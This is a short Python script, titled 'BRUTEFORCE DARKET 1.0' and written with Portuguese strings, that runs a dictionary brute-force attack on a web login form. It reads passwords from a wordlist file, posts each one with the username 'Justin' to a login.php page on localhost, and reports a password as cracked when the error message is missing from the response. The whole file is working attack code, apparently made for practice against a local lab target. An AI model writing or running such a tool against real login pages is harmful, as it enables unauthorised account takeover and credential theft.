#!/usr/bin/python3

import requests
import os

os.system('clear')

with open('password.txt') as file:
     senhas = file.readlines()

     print('='*24)
     print('BRUTEFORCE DARKET 1.0')
     print('='*24)

     for i in senhas:
         senha = i.strip()

         payload = { "nome" : "Justin", "senha" : senha }
         url = 'http://localhost:8000/login.php'
         response = requests.post(url,data=payload)

         if "Usuário ou senha errada!" not in response.text:
             print('\033[92m[+]- SENHA QUEBRADA ==> ', senha,'\033[0m')
         else:
             print('\033[91m[+]- ', senha,'\033[0m')
